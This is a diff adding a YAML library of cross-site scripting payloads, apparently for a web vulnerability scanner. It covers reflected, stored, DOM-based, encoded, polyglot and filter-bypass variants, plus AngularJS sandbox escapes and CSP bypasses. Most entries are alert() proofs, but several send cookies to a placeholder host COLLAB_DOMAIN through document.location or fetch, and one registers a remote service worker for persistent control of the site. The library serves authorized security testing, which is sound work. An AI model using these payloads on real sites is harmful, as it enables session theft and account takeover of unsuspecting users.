@@ -1,0 +1,1845 @@
+defaults:
+  vuln_type: xss
+  encoding: raw
+  source: ensphere
+
+payloads:
+
+  # =============================================================================
+  # REFLECTED XSS — HTML Context (Basic)
+  # =============================================================================
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<script>alert(1)</script>"
+    notes: "Basic script tag injection. Check if reflected unescaped in HTML body."
+    tags: [html, script, probe, confirmation]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<img src=x onerror=alert(1)>"
+    notes: "IMG tag with onerror handler. Bypasses some script tag filters."
+    tags: [html, img, onerror, bypass]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<svg onload=alert(1)>"
+    notes: "SVG onload handler. Works in most browsers."
+    tags: [html, svg, onload]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<svg/onload=alert(1)>"
+    notes: "SVG onload without space. Bypasses space-based filters."
+    tags: [html, svg, onload, bypass]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<body onload=alert(1)>"
+    notes: "Body onload event handler."
+    tags: [html, body, onload]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<details open ontoggle=alert(1)>"
+    notes: "details/ontoggle — fires immediately with open attribute."
+    tags: [html, details, ontoggle]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<marquee onstart=alert(1)>"
+    notes: "Marquee onstart event. Legacy element but still works."
+    tags: [html, marquee, onstart]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<iframe src=\"javascript:alert(1)\">"
+    notes: "iframe with javascript: URI."
+    tags: [html, iframe, javascript_uri]
+
+  # =============================================================================
+  # REFLECTED XSS — Attribute Context
+  # =============================================================================
+
+  - technique: reflected
+    injection_surface: query
+    string_boundary: double_quote
+    evidence_type: content_match
+    risk: 2
+    payload: "\" onmouseover=\"alert(1)"
+    notes: "Break out of double-quoted attribute + event handler."
+    tags: [attribute, double_quote, onmouseover]
+
+  - technique: reflected
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 2
+    payload: "' onmouseover='alert(1)"
+    notes: "Break out of single-quoted attribute + event handler."
+    tags: [attribute, single_quote, onmouseover]
+
+  - technique: reflected
+    injection_surface: query
+    string_boundary: double_quote
+    evidence_type: content_match
+    risk: 2
+    payload: "\"><script>alert(1)</script>"
+    notes: "Break out of attribute + close tag + script injection."
+    tags: [attribute, double_quote, script, breakout]
+
+  - technique: reflected
+    injection_surface: query
+    string_boundary: double_quote
+    evidence_type: content_match
+    risk: 2
+    payload: "\"><img src=x onerror=alert(1)>"
+    notes: "Break out of attribute + img onerror."
+    tags: [attribute, double_quote, img, breakout]
+
+  - technique: reflected
+    injection_surface: query
+    string_boundary: double_quote
+    evidence_type: content_match
+    risk: 2
+    payload: "\" onfocus=\"alert(1)\" autofocus=\""
+    notes: "Inject onfocus + autofocus attributes."
+    tags: [attribute, double_quote, onfocus, autofocus]
+
+  # =============================================================================
+  # REFLECTED XSS — URL Context (href, src, action)
+  # =============================================================================
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "javascript:alert(1)"
+    notes: "javascript: URI for href/src/action attributes."
+    tags: [url_context, javascript_uri]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "javascript:alert(document.domain)"
+    notes: "javascript: URI leaking domain — useful for proof."
+    tags: [url_context, javascript_uri, domain]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "data:text/html,<script>alert(1)</script>"
+    notes: "data: URI with inline HTML/JS."
+    tags: [url_context, data_uri]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "javascript:void(document.location='http://COLLAB_DOMAIN/'+document.cookie)"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "javascript: URI for cookie exfiltration."
+    tags: [url_context, javascript_uri, cookie_theft]
+
+  # =============================================================================
+  # REFLECTED XSS — Script Context
+  # =============================================================================
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "';alert(1)//'"
+    notes: "Break out of JS string (single quote) and execute alert."
+    tags: [script_context, single_quote, breakout]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "\";alert(1)//\""
+    notes: "Break out of JS string (double quote) and execute alert."
+    tags: [script_context, double_quote, breakout]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "</script><script>alert(1)</script>"
+    notes: "Close existing script tag and open new one."
+    tags: [script_context, close_tag, breakout]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "'-alert(1)-'"
+    notes: "JS string breakout using subtraction operator."
+    tags: [script_context, operator, breakout]
+
+  # Template literal context
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "${alert(1)}"
+    notes: "Template literal interpolation. Works inside backtick strings."
+    tags: [script_context, template_literal]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "${document.domain}"
+    notes: "Template literal domain extraction."
+    tags: [script_context, template_literal, domain]
+
+  # =============================================================================
+  # REFLECTED XSS — Event Handler Variants
+  # =============================================================================
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<input onfocus=alert(1) autofocus>"
+    notes: "Input autofocus + onfocus. Fires immediately."
+    tags: [html, input, onfocus, autofocus]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<video src=x onerror=alert(1)>"
+    notes: "Video onerror handler."
+    tags: [html, video, onerror]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<audio src=x onerror=alert(1)>"
+    notes: "Audio onerror handler."
+    tags: [html, audio, onerror]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<object data=\"javascript:alert(1)\">"
+    notes: "Object tag with javascript: data URI."
+    tags: [html, object, javascript_uri]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<select onfocus=alert(1) autofocus>"
+    notes: "Select autofocus + onfocus."
+    tags: [html, select, onfocus]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<textarea onfocus=alert(1) autofocus>"
+    notes: "Textarea autofocus + onfocus."
+    tags: [html, textarea, onfocus]
+
+  # =============================================================================
+  # REFLECTED XSS — Header / Cookie / Path Injection
+  # =============================================================================
+
+  - technique: reflected
+    injection_surface: header
+    evidence_type: content_match
+    risk: 2
+    payload: "<script>alert(1)</script>"
+    notes: "XSS via HTTP header reflection (Referer, User-Agent, X-Forwarded-For)."
+    tags: [html, script, header]
+
+  - technique: reflected
+    injection_surface: cookie
+    evidence_type: content_match
+    risk: 2
+    payload: "<script>alert(1)</script>"
+    notes: "XSS via cookie value reflection."
+    tags: [html, script, cookie]
+
+  - technique: reflected
+    injection_surface: path
+    evidence_type: content_match
+    risk: 2
+    payload: "<script>alert(1)</script>"
+    notes: "XSS via URL path segment reflection."
+    tags: [html, script, path]
+
+  - technique: reflected
+    injection_surface: path
+    evidence_type: content_match
+    risk: 2
+    payload: "<img src=x onerror=alert(1)>"
+    notes: "IMG onerror via path reflection."
+    tags: [html, img, path]
+
+  # =============================================================================
+  # REFLECTED XSS — Filter / WAF Bypass
+  # =============================================================================
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<ScRiPt>alert(1)</ScRiPt>"
+    notes: "Mixed case to bypass case-sensitive filters."
+    tags: [bypass, mixed_case]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<scr<script>ipt>alert(1)</scr</script>ipt>"
+    notes: "Nested tag bypass. If filter removes <script> once, inner tags reconstruct."
+    tags: [bypass, nested]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<img src=x onerror=alert`1`>"
+    notes: "Template literal backticks instead of parentheses."
+    tags: [bypass, template_literal, no_parens]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<img src=x onerror=alert&lpar;1&rpar;>"
+    notes: "HTML entity encoded parentheses."
+    tags: [bypass, html_entity]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"
+    notes: "SVG animate onbegin — less commonly filtered event."
+    tags: [bypass, svg, animate]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<a href=\"javascript:alert(1)\">click</a>"
+    notes: "Anchor tag with javascript: href."
+    tags: [html, anchor, javascript_uri]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<img/src=x/onerror=alert(1)>"
+    notes: "Forward slashes instead of spaces. Bypasses space-based filters."
+    tags: [bypass, no_space, slash]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<img\tsrc=x\tonerror=alert(1)>"
+    notes: "Tab characters instead of spaces."
+    tags: [bypass, no_space, tab]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<IMG SRC=\"\" onerror=\"alert(String.fromCharCode(88,83,83))\">"
+    notes: "String.fromCharCode to avoid literal 'alert' string."
+    tags: [bypass, fromcharcode]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<svg onload=alert(1)//>"
+    notes: "SVG self-closing with JS comment."
+    tags: [html, svg, self_closing]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<img src=x:alert(alt) onerror=eval(src) alt=1>"
+    notes: "Indirect eval via src attribute."
+    tags: [bypass, eval, indirect]
+
+  # =============================================================================
+  # ENCODED VARIANTS
+  # =============================================================================
+
+  # HTML entity encoding
+  - technique: reflected
+    injection_surface: query
+    encoding: html_entity
+    evidence_type: content_match
+    risk: 2
+    payload: "&lt;img src=x onerror=alert(1)&gt;"
+    notes: "HTML entity encoded. If double-decoded, triggers XSS."
+    tags: [html, encoded, html_entity]
+
+  - technique: reflected
+    injection_surface: query
+    encoding: html_entity
+    evidence_type: content_match
+    risk: 2
+    payload: "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"
+    notes: "Hex HTML entities. Tests for double decoding."
+    tags: [html, encoded, hex_entity]
+
+  # JS escape
+  - technique: reflected
+    injection_surface: query
+    encoding: js_escape
+    evidence_type: content_match
+    risk: 2
+    payload: "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"
+    notes: "JS hex escape sequences. If interpreted as JS string then inserted into DOM."
+    tags: [script_context, encoded, js_hex]
+
+  - technique: reflected
+    injection_surface: query
+    encoding: js_escape
+    evidence_type: content_match
+    risk: 2
+    payload: "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
+    notes: "JS unicode escape sequences."
+    tags: [script_context, encoded, js_unicode]
+
+  # URL-encoded
+  - technique: reflected
+    injection_surface: query
+    encoding: url
+    evidence_type: content_match
+    risk: 2
+    payload: "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+    notes: "URL-encoded script tag."
+    tags: [html, url_encoded]
+
+  - technique: reflected
+    injection_surface: query
+    encoding: url
+    evidence_type: content_match
+    risk: 2
+    payload: "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
+    notes: "URL-encoded img onerror."
+    tags: [html, url_encoded, img]
+
+  - technique: reflected
+    injection_surface: query
+    encoding: double_url
+    evidence_type: content_match
+    risk: 2
+    payload: "%253Cscript%253Ealert(1)%253C%252Fscript%253E"
+    notes: "Double URL-encoded. Bypasses single-decode WAF."
+    tags: [html, double_url_encoded, bypass]
+
+  # =============================================================================
+  # STORED XSS — Form / JSON Body
+  # =============================================================================
+
+  - technique: stored
+    injection_surface: form_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<script>alert(document.domain)</script>"
+    notes: "Stored XSS via form submission. Check if payload persists and renders."
+    tags: [html, script, stored, form]
+
+  - technique: stored
+    injection_surface: form_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<img src=x onerror=alert(document.domain)>"
+    notes: "Stored IMG onerror via form submission."
+    tags: [html, img, stored, form]
+
+  - technique: stored
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<script>alert(document.domain)</script>"
+    notes: "Stored XSS via JSON API (e.g., profile name, comment body)."
+    tags: [html, script, stored, json]
+
+  - technique: stored
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<img src=x onerror=alert(document.domain)>"
+    notes: "Stored IMG onerror via JSON API."
+    tags: [html, img, stored, json]
+
+  - technique: stored
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<svg onload=alert(document.domain)>"
+    notes: "Stored SVG onload via JSON API."
+    tags: [html, svg, stored, json]
+
+  - technique: stored
+    injection_surface: form_body
+    evidence_type: content_match
+    risk: 3
+    payload: "test<script>fetch('http://COLLAB_DOMAIN/'+document.cookie)</script>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Stored XSS with cookie exfiltration via fetch."
+    tags: [html, script, stored, cookie_theft]
+
+  # Stored — file upload context
+  - technique: stored
+    injection_surface: file_upload
+    evidence_type: content_match
+    risk: 3
+    payload: "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>"
+    notes: "SVG file upload with onload XSS. Upload as .svg."
+    tags: [svg, file_upload, stored]
+
+  - technique: stored
+    injection_surface: file_upload
+    evidence_type: content_match
+    risk: 3
+    payload: "GIF89a<script>alert(document.domain)</script>"
+    notes: "GIF header + script. Upload as image, serve as HTML if content-type wrong."
+    tags: [polyglot, gif, file_upload, stored]
+
+  # Stored — Markdown injection
+  - technique: stored
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "![xss](https://example.com \"onmouseover=alert(1)\")"
+    notes: "Markdown image with event handler in title attribute. Targets renderers that pass title to HTML unescaped."
+    tags: [stored, markdown, img_title]
+
+  - technique: stored
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "[click me](javascript:alert(document.domain))"
+    notes: "Markdown link with javascript: URI. Many renderers allow this protocol."
+    tags: [stored, markdown, javascript_uri]
+
+  - technique: stored
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "![alt\"onerror=\"alert(1)](x)"
+    notes: "Markdown image alt text breakout to inject onerror handler."
+    tags: [stored, markdown, alt_breakout]
+
+  - technique: stored
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "[link](data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+)"
+    notes: "Markdown link with base64 data URI containing script. Targets renderers that allow data: in href."
+    tags: [stored, markdown, data_uri, base64]
+
+  # Stored — Rich text / contenteditable
+  - technique: stored
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<div contenteditable=\"true\" onfocus=\"alert(document.domain)\" tabindex=\"0\">click to edit</div>"
+    notes: "Contenteditable div with onfocus. Fires when user interacts with rich text field."
+    tags: [stored, richtext, contenteditable]
+
+  - technique: stored
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<p style=\"font-size:0\">x</p><img src=x onerror=alert(document.domain)>"
+    notes: "Rich text editor bypass: hidden paragraph followed by img onerror. Sanitizers may miss the img after block elements."
+    tags: [stored, richtext, sanitizer_bypass]
+
+  # Stored — SVG animation
+  - technique: stored
+    injection_surface: file_upload
+    evidence_type: content_match
+    risk: 3
+    payload: "<svg xmlns=\"http://www.w3.org/2000/svg\"><set attributeName=\"onmouseover\" to=\"alert(document.domain)\"/></svg>"
+    notes: "SVG set element to inject event handler via animation. Fires on hover."
+    tags: [stored, svg, animation, set]
+
+  - technique: stored
+    injection_surface: file_upload
+    evidence_type: content_match
+    risk: 3
+    payload: "<svg xmlns=\"http://www.w3.org/2000/svg\"><animate onbegin=\"alert(document.domain)\" attributeName=\"x\" dur=\"1s\"/></svg>"
+    notes: "SVG animate onbegin fires when animation starts."
+    tags: [stored, svg, animation, animate]
+
+  # Stored — Profile / display name injection
+  - technique: stored
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "User<img src=x onerror=alert(document.domain)>"
+    notes: "Username / display name field injection. Renders wherever the name is displayed."
+    tags: [stored, profile, username]
+
+  - technique: stored
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "About me<script>alert(document.domain)</script>"
+    notes: "Bio / about field stored XSS. Bio fields often render richer HTML."
+    tags: [stored, profile, bio]
+
+  # Stored — Comment / review
+  - technique: stored
+    injection_surface: form_body
+    evidence_type: content_match
+    risk: 3
+    payload: "Great product!<details open ontoggle=alert(document.domain)><summary>review</summary></details>"
+    notes: "Comment/review stored XSS using details/ontoggle. Less likely to be filtered than script tags."
+    tags: [stored, comment, details]
+
+  - technique: stored
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<a href=\"\" onclick=\"alert(document.domain)\">See more</a>"
+    notes: "Stored anchor onclick in comments/reviews. Fires on user click."
+    tags: [stored, comment, anchor, onclick]
+
+  # Stored — Email / notification template injection
+  - technique: stored
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<img src=\"http://COLLAB_DOMAIN/pixel.gif\" style=\"display:none\">"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Email template pixel tracking via stored field. Confirms HTML rendering in email context."
+    tags: [stored, email, tracking, probe]
+
+  - technique: stored
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<table background=\"javascript:alert(document.domain)\">"
+    notes: "Email template XSS via table background attribute. Works in some email clients."
+    tags: [stored, email, table, legacy]
+
+  # Stored — Filename XSS
+  - technique: stored
+    injection_surface: file_upload
+    evidence_type: content_match
+    risk: 3
+    payload: "\"><img src=x onerror=alert(document.domain)>.png"
+    notes: "XSS via uploaded filename. If filename reflected in download page or file listing without escaping."
+    tags: [stored, filename, file_upload, breakout]
+
+  # Stored — HTML file upload
+  - technique: stored
+    injection_surface: file_upload
+    evidence_type: content_match
+    risk: 3
+    payload: "<html><body><script>alert(document.domain)</script></body></html>"
+    notes: "Upload HTML file directly. If served from same origin without Content-Disposition: attachment."
+    tags: [stored, html_file, file_upload, same_origin]
+
+  # Stored — JSON field nested HTML
+  - technique: stored
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<iframe srcdoc=\"<script>alert(document.domain)</script>\">"
+    notes: "iframe srcdoc attribute containing inline HTML with script. srcdoc runs in same origin context."
+    tags: [stored, iframe, srcdoc]
+
+  # Stored — Webhook / callback URL field
+  - technique: stored
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "javascript:alert(document.domain)"
+    notes: "Stored javascript: URI in URL-type fields (webhook, callback, redirect). Triggers if field rendered as clickable link."
+    tags: [stored, webhook_url, javascript_uri]
+
+  # =============================================================================
+  # DOM-BASED XSS
+  # =============================================================================
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "#<img src=x onerror=alert(1)>"
+    notes: "DOM XSS via URL hash fragment. Check if location.hash used in innerHTML."
+    tags: [dom, hash, img]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "javascript:alert(1)"
+    notes: "DOM XSS via location assignment. Check if query params set window.location."
+    tags: [dom, location, javascript_uri]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "\"><img src=x onerror=alert(1)>"
+    notes: "DOM XSS via innerHTML with attribute breakout."
+    tags: [dom, innerhtml, breakout]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<img src=x onerror=alert(document.domain)>"
+    notes: "DOM XSS probe with domain exfil for proof."
+    tags: [dom, img, domain]
+
+  # DOM — document.write() sink
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<script>alert(1)</script>"
+    notes: "DOM XSS via document.write() sink. Check if query param value flows to document.write()."
+    tags: [dom, document_write, script]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "\"></title><script>alert(1)</script>"
+    notes: "document.write() into title context. Breaks out of title tag first."
+    tags: [dom, document_write, title_breakout]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "');alert(1)//'"
+    notes: "document.write() injecting into JS string context within the written content."
+    tags: [dom, document_write, js_string]
+
+  # DOM — eval / setTimeout / setInterval sinks
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "1;alert(1)"
+    notes: "DOM XSS via eval() sink. Append statement to evaluated expression."
+    tags: [dom, eval, semicolon]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "alert(document.domain)"
+    notes: "DOM XSS via setTimeout()/setInterval() with string argument from user input."
+    tags: [dom, settimeout, string_arg]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: ");alert(1)//"
+    notes: "DOM XSS breaking out of function call passed to eval/setTimeout."
+    tags: [dom, eval, function_breakout]
+
+  # DOM — window.name
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<img src=x onerror=alert('wn')>"
+    notes: "DOM XSS via window.name. Set window.name on attacker page, navigate to target that reads it into innerHTML."
+    tags: [dom, window_name, cross_window]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "alert('wn-'+document.domain)"
+    notes: "DOM XSS via window.name into eval() sink. window.name persists across navigations."
+    tags: [dom, window_name, eval]
+
+  # DOM — postMessage handler
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<img src=x onerror=alert('pm')>"
+    notes: "DOM XSS via postMessage handler that inserts event.data into innerHTML without origin check."
+    tags: [dom, postmessage, innerhtml]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "javascript:alert('pm-'+document.domain)"
+    notes: "DOM XSS via postMessage handler that passes event.data to location or window.open."
+    tags: [dom, postmessage, location_assign]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "{\"type\":\"redirect\",\"url\":\"javascript:alert(document.domain)\"}"
+    notes: "DOM XSS via postMessage JSON payload. Handler parses JSON and navigates to url field."
+    tags: [dom, postmessage, json, redirect]
+
+  # DOM — location.hash fragment
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "#javascript:alert(1)"
+    notes: "location.hash used in location assignment. If code does location=hash.slice(1), triggers XSS."
+    tags: [dom, hash, location_assign]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "#<svg onload=alert(document.domain)>"
+    notes: "location.hash inserted into innerHTML. SVG onload variant for hash-based DOM XSS."
+    tags: [dom, hash, svg, innerhtml]
+
+  # DOM — document.referrer sink
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "http://example.com/page?<img src=x onerror=alert(1)>"
+    notes: "DOM XSS via document.referrer sink. If referrer is inserted into DOM via innerHTML."
+    tags: [dom, referrer, innerhtml]
+
+  # DOM — Web Storage (localStorage / sessionStorage)
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<img src=x onerror=alert('ls')>"
+    notes: "DOM XSS via localStorage/sessionStorage. Payload stored in storage then rendered into DOM on page load."
+    tags: [dom, localstorage, innerhtml]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "alert('ss-'+document.domain)"
+    notes: "DOM XSS via Web Storage value passed to eval(). Check if stored preference/setting is eval'd."
+    tags: [dom, sessionstorage, eval]
+
+  # DOM — URL search params into outerHTML / insertAdjacentHTML
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<svg onload=alert(document.domain)>"
+    notes: "DOM XSS via insertAdjacentHTML() or outerHTML sink. Query param value used in these sinks bypasses Trusted Types if not enforced."
+    tags: [dom, insertadjacenthtml, outerhtml]
+
+  # DOM — Prototype pollution to XSS
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "__proto__[innerHTML]=<img src=x onerror=alert(1)>"
+    notes: "Prototype pollution gadget leading to DOM XSS. If library reads innerHTML from polluted prototype."
+    tags: [dom, prototype_pollution, gadget]
+
+  # DOM — Service Worker registration
+  - technique: dom
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 3
+    payload: "javascript:navigator.serviceWorker.register('http://COLLAB_DOMAIN/sw.js')"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "DOM XSS escalation via Service Worker registration. Persistent control over origin if SW scope allows."
+    tags: [dom, service_worker, persistent]
+
+  # DOM — URL constructor
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "javascript:alert(document.domain)//http:"
+    notes: "DOM XSS via URL(user_input). javascript: passes URL constructor validation when followed by //."
+    tags: [dom, url_constructor, javascript_uri]
+
+  # =============================================================================
+  # POLYGLOT
+  # =============================================================================
+
+  - technique: polyglot
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
+    notes: "Polyglot XSS payload. Works across HTML, attribute, script, and URL contexts."
+    tags: [polyglot, universal]
+
+  - technique: polyglot
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "'\"><img src=x onerror=alert(1)>//"
+    notes: "Simple polyglot — breaks out of single/double quotes, attribute, HTML contexts."
+    tags: [polyglot, simple]
+
+  - technique: polyglot
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "--></script><script>alert(1)</script>"
+    notes: "Polyglot for HTML comment and script contexts."
+    tags: [polyglot, comment, script]
+
+  - technique: polyglot
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "*/alert(1)/*"
+    notes: "Polyglot for JS comment context breakout."
+    tags: [polyglot, js_comment]
+
+  # =============================================================================
+  # FRAMEWORK-SPECIFIC BYPASS
+  # =============================================================================
+
+  # Angular
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "{{constructor.constructor('alert(document.domain)')()}}"
+    notes: "AngularJS (1.x) sandbox escape via constructor chain. Works on versions < 1.6."
+    tags: [framework, angular, sandbox_escape, template_injection]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "{{$on.constructor('alert(document.domain)')()}}"
+    notes: "AngularJS sandbox escape via $on.constructor for Angular 1.2-1.5."
+    tags: [framework, angular, sandbox_escape]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<div ng-app ng-csp><div ng-focus=\"x=$event\" tabindex=0>focus</div><script nonce>x.composedPath()|orderBy:'[].constructor.from([1],alert)'</script></div>"
+    notes: "Angular CSP bypass using ng-focus + orderBy filter to execute arbitrary code."
+    tags: [framework, angular, csp_bypass, ng_csp]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<x ng-app>{{String.constructor('alert(document.domain)')()}}"
+    notes: "AngularJS template injection on page without explicit ng-app scope. Auto-bootstrap with ng-app on arbitrary element."
+    tags: [framework, angular, auto_bootstrap]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "{{[].pop.constructor('alert(document.domain)')()}}"
+    notes: "AngularJS sandbox bypass via Array.pop.constructor for older versions."
+    tags: [framework, angular, array_constructor]
+
+  # React
+  - technique: dom
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "{\"__html\":\"<img src=x onerror=alert(document.domain)>\"}"
+    notes: "React dangerouslySetInnerHTML exploitation. If user input flows to this prop, XSS occurs."
+    tags: [framework, react, dangerously_set_innerhtml]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "javascript:alert(document.domain)"
+    notes: "React href XSS. React warns but allows javascript: in href attributes."
+    tags: [framework, react, href, javascript_uri]
+
+  - technique: dom
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<img src=x onerror=alert(document.domain)>"
+    notes: "React server-side rendering (SSR) XSS. If user input included in SSR HTML without escaping."
+    tags: [framework, react, ssr, innerhtml]
+
+  # Vue
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<div v-html=\"'<img src=x onerror=alert(document.domain)>'\"></div>"
+    notes: "Vue v-html directive with user-controlled data renders raw HTML."
+    tags: [framework, vue, v_html]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "{{_c.constructor('alert(document.domain)')()}}"
